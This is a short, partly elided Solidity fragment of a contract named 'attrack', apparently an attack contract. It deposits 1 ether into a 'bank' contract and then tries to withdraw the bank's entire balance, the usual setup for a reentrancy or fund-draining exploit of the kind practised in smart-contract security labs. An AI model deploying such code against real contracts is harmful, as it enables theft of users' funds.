...
contract attrack {
    ...
    function attract(uint256 amount) payable public {
        require(amount == 1 * 10**18, "need 1 ether");
        bank.deposit{value: 1 ether}(amount);
        geteth();
    }
    function geteth() public {
        uint256 total = getbankBalance();
        bank.withdraw(total);
    }
